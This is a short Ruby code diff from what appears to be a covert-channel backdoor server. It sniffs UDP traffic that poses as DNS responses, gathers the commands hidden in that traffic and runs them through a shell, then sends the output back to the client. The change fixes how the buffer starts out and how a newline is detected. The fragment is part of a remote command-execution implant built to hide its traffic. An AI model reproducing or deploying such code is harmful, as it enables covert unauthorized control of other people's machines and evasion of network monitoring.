@@ -38,17 +38,18 @@ class Server
   conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
   filter = "udp and dst port " + $cliPass.to_s + " and src port 53"
   cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
+  str = " "
   cap.stream.each do |p|
     puts "Client packet verified and recieved"
     pkt = Packet.parse p
     str += conn.servRecv(pkt)
     puts str
-    if str[str.length-1] == 10 #aka newline
+    if str[str.length-1] == 10 || str[str.length-2] == 10 || str[str.length-3] == 10 || str[str.length-4] == 10 #aka newline
       result = @shell.executeCmd(str)
       if result != nil
         conn.send(result)
       end
-      str = nil
+      str = " "
     end
   end
 
